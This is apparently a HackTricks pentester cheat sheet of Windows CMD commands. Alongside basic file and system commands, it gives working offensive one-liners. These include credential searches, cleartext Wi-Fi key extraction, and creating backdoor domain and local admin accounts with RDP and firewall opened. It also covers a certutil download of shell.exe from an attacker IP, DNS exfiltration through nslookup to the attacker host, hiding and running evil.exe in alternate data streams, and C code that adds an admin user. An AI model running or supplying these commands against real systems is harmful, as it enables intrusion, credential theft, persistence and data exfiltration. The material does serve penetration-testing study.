# Basic Win CMD for Pentesters

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## basics

```bash
# System Navigation

help <command> # Provides help information for Windows commands
cls # clear screen
doskey /history # retrive the commands history
dir # Listing A Directory
dir /a # show the hiden files
dir /b # bar format (only the files/folders)
cd # show the curent working directory
cd C:\Users\mido\ # move the the the absolute path
cd .\pic # move to relative path
tree # print the entire path and it subdirectory
tree /F # print the entire path and it sudirectory and it files 

-----------------------------------------------------------------
# working with directories

mkdir or md # make new directory
rmdir or rd # remove the directory 
rd /S # remove the directory and it content
move example C:\Users\htb\Documents\exampl # move the directory and it contents to another path

xcopy [source] [destination] # Copy file(s) and folder(s) from the source folder to the destination folder. Replaced by Robocopy and currently deprecated.
xcopy /E [source] [destination] # Copy file(s) and folder(s) from the source folder to the destination folder, including empty directories.
xcopy /K [source] [destination] # Copy file(s) and folder(s) from the source folder to the destination folder. Retains the current attributes of the copied files.

robocopy [source] [destination] # Copy files(s) and folder(s) from the source folder to the destination folder. It has a more robust feature set compared to xcopy.

robocopy /E /MIR /A-:SH [source] [destination] # Copy files(s) and folder(s) from the source folder to the destination folder. Mirrors the destination directory to the source and clears any additional attributes using the `/A-:SH` parameter.
--------------------------------------------------------------------
# files

more <file> # Displays the output of a file or command one screen at a time.
more /S <file> # Displays the output of a file or command one screen at a time. Compresses multiple blank lines into a single line.
systeminfo | more # Displays the output of a command through a <PIPE> to `more`.
type <file> # Displays the contents of a file.
type <file> >> <file2> # Redirect content of file1 to file2


echo "Check out this text" > demo.txt # crat file
echo "Check out this text" > demo.txt # appaend new content to a file
fsutil file createNew <filename> <length> # Creates a new file with a specified file name and length.
ren <filename1> <filename2>  # Renames a file.
--------------------------------------------------------------------
# input / output
#output
ipconfig /all > details.txt # save the output into file 
ipconfig /all >> details.txt #  append the output into fil
# input 
find /i "see" < test.txt #  Pass in a Text File to a Command

ipconfig /all | find /i "IPV4" #  Pipe Output Between Commands

ping  8.8.8.8 & type test.txt # run first command then the second

cd C:\Users\student\Documents\Backup && echo 'did this work' > yes.txt # run command A, and if it succeeds, run command B
----------------------------------------------------------------------
# deleting files
del <file or directory> # delete file or directory
erase file-3 file-5 # delete a list of files

dir /A:R # show us anything with the Read-only attribute
del /A:R * # delet any read-only file

dir /A:H # show the hidden files 
del /A:H * # delet any

del /F <directory> & rd <directory> # force to remove the directory with it content
----------------------------------------------------------------------
copy <file> <file2> # copy file
move <file> <file2> # move file
----------------------------------------------------------------------
# searching for files 
where calc.exe # saerch for filein environment variable path only
where /R file.txt # search for file in all directories
where /R c:\Users\student\ *.csv # seach in spisific directory and go deep on it
----------------------------------------------------------------------
# searching in file content 

find 'password' "c:\Users\student\config.txt" # seach for in file content 
find /V 'rawen' "c:\Users\rawen\msg.txt" # show any line that does not have the specified string 'rawen'
find \N 'ahmed' "c:\Users\ahmed\ahmed.txt" # display the line numbers 
find /I "Rawen" "c:\Users\ahmed.txt" # ignore case sensitivity (rawen,RAWEN..)

find # Basic Find Options
/c  # Count the number of lines that match
/v  # Show lines that DO NOT match (inverted match)
/n  # Show line numbers for matching lines
/i  # Case-insensitive search


findstr  # Regex support + can be piped

# Basic Findstr Options
/i  # Case-insensitive search
/s  # Search in subdirectories
/m  # Show only filenames with matches
/v  # Show lines that do NOT match
/n  # Show line numbers
/p  # Skip files with unprintable characters
/c:".txt$"  # Exact phrase search
/r  # Use regular expressions (regix)

findstr /s /r /c:".*" *.txt # find nonempty .txt file in sub dir 
# Regex Support
.  # Any character
*  # Zero or more occurrences
^  # Start of line
$  # End of line
[]  # Match characters inside brackets

# example 
dir /a # show hiden files 
findstr /r /c:".txt$" # find the line end with ".txt"
find /c /v "" # count the non empty lines 
dir /a  | findstr /r /c:".txt$" | find /c /v "" # count the hiden files

# Practical Usage Examples
findstr /si password *.txt *.ini *.cfg  # Find passwords in files
reg query HKLM /f "password" /t REG_SZ /s  # Search registry for credentials
findstr /si "password user passkey" *.php *.asp *.js *.config  # Find hardcoded creds in source code
findstr /si "api_key secret token" dump.txt  # Extract API keys from dumps
findstr /si "username:s:" C:\Users\*\Documents\*.rdp  # Locate saved RDP credentials
schtasks /query /fo list /v | findstr /i "cmd exe powershell"  # Find suspicious scheduled tasks
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword  # Check Windows auto-login password
findstr /si "PRIVATE KEY" C:\Users\*\*.pem  # Search SSH private keys
net share | findstr /i "Admin"  # Identify hidden admin shares
findstr /si "password" C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data  # Find cached credentials in browsers

----------------------------------------------------------------------
# comparing files

comp <.\file-1.md> <.\file-2.md> # compare the 2 files
fc <file1> <file2 /N > # compare the 2 files, /N display the line number. it best then comp

hasher <file> # check MD5 message digest
----------------------------------------------------------------------
# sorting 
sort <file> /O sorted_file.txt #sort the file and save it in new file
sort <file> /uique <file> # sort the file + remove the diblicated lines
-----------------------------------------------------------------------
tar -xf file.zip # extrace zip file
tar -xf file.tar # extrace tar file

# on old windows (xp or 7)
mshta "javascript:var shell=new ActiveXObject('Shell.Application'); shell.NameSpace('C:\\destination\\').CopyHere(shell.NameSpace('C:\\path\\to\\yourfile.zip').Items());close();"
-----------------------------------------------------------------------
h

```



#### interesting directories 
```bash
C:\Windows\Temp # Global directory containing temporary system files accessible to all users on the system. All users, regardless of authority, are provided full read, write, and execute permissions in this directory. Useful for dropping files as a low-privilege user on the system.

C:\Users\<user>\AppData\Local\Temp # Local directory containing a user's temporary files accessible only to the user account that it is attached to. Provides full ownership to the user that owns this folder. Useful when the attacker gains control of a local/domain joined user account.

C:\Users\Public # Publicly accessible directory allowing any interactive logon account full access to read, write, modify, execute, etc., files and subfolders within the directory. Alternative to the global Windows Temp Directory as it's less likely to be monitored for suspicious activity.

C:\Program Files # folder containing all 64-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.

C:\Program Files (x86) # Folder containing all 32-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.
```
## System info
[Microsoft Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands) has a complete listing of the commands that can be issued within the command-line interpreter as well as detailed descriptions of how to use them
[ss64](https://ss64.com/nt/) Is a handy quick reference for anything command-line related, including cmd, PowerShell, Bash, and more.
### Version and Patches info

```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic computersystem LIST full #Get PC info

wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic qfe list brief #Updates

hostname # hostname of the machine
ver # operating system version

DRIVERQUERY #3rd party driver vulnerable?
```

### Environment

```bash
set #List all environment variables
# Example: Environment Variable
%EXAMPLE_VARIABLE%
set <%VARIABLE_NAME%>  # Get variable value
echo <%VARIABLE_NAME%>  # Print variable value
set <%VARIABLE_NAME%>=<Value>  # Set variable (session)
setx <%VARIABLE_NAME%> <Value>  # Set variable (global)
set <%VARIABLE_NAME%>=  # Remove variable (session)
setx <%VARIABLE_NAME%> ""  # Remove variable (global)
```

Some env variables to highlight:

* **COMPUTERNAME**: Name of the computer
* **TEMP/TMP:** Temp folder
* **USERNAME:** Your username
* **HOMEPATH/USERPROFILE:** Home directory
* **windir:** C:\Windows
* **OS**:Windos OS
* **LOGONSERVER**: Name of domain controller or the workgroup
* **USERDNSDOMAIN**: Domain name to use with DNS
* **USERDOMAIN**: Name of the domain
* **PATH** : Specifies a set of directories(locations) where executable programs are located.
* **USERPROFILE** : Provides us with the location of the currently active user's home directory. Expands to `C:\Users\{username}`.


```bash
nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC
```

### Mounted disks

```bash
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
wmic logicaldisk get caption,description,providername
```

### [Defender](authentication-credentials-uac-and-efs/#defender)

### Recycle Bin

```bash
dir C:\$Recycle.Bin /s /b
```

### Processes, Services & Software

```bash
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
schtasks 	# Displays all tasks scheduled on the local machine.
schtasks /query 	# Displays all tasks scheduled on the local machine. Interchangeable with schtasks command.
schtasks /query /V /FO list 	#Displays all scheduled tasks with verbose information in a list format.
schtasks /create 	#Allows for the creation of scheduled tasks.
schtasks /create /sc <Schedule Frequency> /tn <Task Name> /tr <Program Path> #Creates a new scheduled task based on a select schedule, with a provided name, and a program specified to run when the task starts.
schtasks /change 	# Allows for modification of an existing scheduled task.
schtasks /change /tn <Task Name> /ru <Username> /rp <Password> 	#Modifies a scheduled task with a specified name to run under the permissions of the user account using the provided password for authentication.
schtasks /delete 	#Allows for the deletion of scheduled tasks.
schtasks /delete /tn <Task Name> 	#Deletes a scheduled task with the matching name.
------------------------------------------------------------------
tasklist /V #List processes
------------------------------------------------------------------
# services:
tasklist /SVC #links processes to started services
net start #list all of the active services on the system
wmic service list brief #list all services existing on our system

sc query #List of services , Lists both services and drivers.
sc query type= service # Lists only services, excluding drivers.
sc query <Name> # Lists details about a specific service by name.
sc stop <Name> #  Stop a service by name.
sc start <Name> #  Start a service by name.
sc config <Name> start= disabled #  Change settings of the service specified (Disabling Service)

------------------------------------------------------------------
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software
```

## Domain info

```bash
# Generic AD info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
gpresult /V # Get current policy applied
wmic ntdomain list /format:list	#Displays information about the Domain and Domain Controllers

# Users
dsquery user #Get all users
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
wmic useraccount list /format:list #Displays information about all local accounts and any domain accounts that have logged into the device
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname #Get all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET # Get info of 1 users
wmic sysaccount list /format:list #¬†Dumps information about any system accounts that are being used as service accounts.

# Groups
net group /domain #List of domain groups
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
net group "Domain Admins" /domain #List users with domain admin privileges
net group "domain computers" /domain #List of PCs connected to the domain
net group "Domain Controllers" /domain #List PC accounts of domains controllers
wmic group list /format:list # Information about all local groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group

# Computers
dsquery computer #Get all computers
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers

# Trust relations
nltest /domain_trusts #Mapping of the trust relationships

# Get all objects inside an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

### Logs & Events

```bash
wevtutil /?
wevtutil el # enumerate the names of all logs present on a Windows system
wevtutil gl "windows powershell" #display configuration information for a specific log
wevtutil gli "windows powershell" # Get log status information.
wevtutil qe Security /c:5 /rd:true /f:text # display the last 5 most recent events from the Security log in text format

wevtutil epl System C:\system_export.evtx # Exporting Events

#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321

Get-WinEvent # can show us the specific records and how many there are 
```

## Users & Groups

### Users

```bash
#Me
whoami # current domain and the user name of the logged-in account. If the current user is not a domain-joined account, the `NetBIOS` name will be provided instead. The current `hostname` will be used in most cases.

whoami /all #All info about me, take a look at the enabled tokens
whoami /priv # Checking Out Our Privileges
whoami /groups # chcek user groups
# Local users
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
wmic USERACCOUNT Get Domain,Name,Sid
net user /add [username] [password] #Create user

# Other users looged
qwinsta #Anyone else logged in?

#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```

### Groups

```bash
#Local
whoami /groups # shows **all groups** your user belongs to, including system-defined ones.

net localgroup #All available groups [regardless of whether your user is a member of them.]. and lists only local groups managed by admins.
# **You can‚Äôt manage system groups**, but local groups can be modified with `net localgroup`.

net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group
```

### List sessions

```
qwinsta
klist sessions
```

### Password Policy

```
net accounts
```

### Credentials

```bash
cmdkey /list #List credential
vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
rundll32 keymgr.dll, KRShowKeyMgr #You need graphical access
```

### Persistence with users

```bash
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add
```

## Network

### Interfaces, Routes, Ports, Hosts and DNSCache

```bash
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Address Resolution Protocol (`ARP`) cache
netstat -ano #Opened ports?
nslookup ACADEMY-ICL-DC # check the dns 

type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```

### Firewall

```bash
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop" 

#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add ‚ÄúHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server‚Äù /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```

### Shares

```bash 
net view # Lists shared resources on the network
net view \\computer /ALL #List shares of a computer , ex net view \\PC-Name
net use x: \\computer\share #Mount the share locally 
net share #Lists shares on your local machine
```

### Wifi

```bash
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
```

### SNMP

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```

### Network Interfaces

```bash
ipconfig /all
```

### ARP table

```bash
arp -A
```

## Download

Bitsadmin.exe

```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```

CertReq.exe

```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```

Certutil.exe

```
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe
```

**Find much more searching for `Download` in** [**https://lolbas-project.github.io**](https://lolbas-project.github.io/)

## Misc

```bash
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list without shit
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file

#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden

#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win

#exe2bat to transform exe file in bat file

#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

# Get error messages from code
net helpmsg 32 #32 is the code in that case
```

### Bypass Char Blacklisting

```bash
echo %HOMEPATH:~6,-11%   #\
who^ami   #whoami
```

### DOSfuscation

Generates an obfuscated CMD line

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
SET COMMAND type C:\Users\Administrator\Desktop\flag.txt
encoding
```

### Listen address ACLs

You can listen on [http://+:80/Temporary\_Listen\_Addresses/](http://+/Temporary\_Listen\_Addresses/) without being administrator.

```bash
netsh http show urlacl
```

### Manual DNS shell

**Attacker** (Kali) must use one of these 2 options:

```bash
sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
```

#### Victim

**`for /f tokens`** technique: This allows us to execute commands, get the first X words of each line and send it through DNS to our server

```bash
for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
```

You can also **redirect** the output, and then **read** it.

```
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
```

## Calling CMD from C code

```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */

// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe

int main (){
    int i;
    i=system("net users otherAcc 0TherAcc! /add");
    i=system("net localgroup administrators otherAcc /add");
    return 0;
}
```

## Alternate Data Streams CheatSheet (ADS/Alternate Data Stream)

**Examples taken from** [**https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f**](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)**. There are a lot more in there!**

```bash
## Selected Examples of ADS Operations ##

### Adding Content to ADS ###
# Append executable to a log file as an ADS
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
# Download a script directly into an ADS
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt

### Discovering ADS Content ###
# List files and their ADS
dir /R
# Use Sysinternals tool to list ADS of a file
streams.exe <c:\path\to\file>

### Extracting Content from ADS ###
# Extract an executable stored in an ADS
expand c:\ads\file.txt:test.exe c:\temp\evil.exe

### Executing ADS Content ###
# Execute an executable stored in an ADS using WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
# Execute a script stored in an ADS using PowerShell
powershell -ep bypass - < c:\temp:ttt
```

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
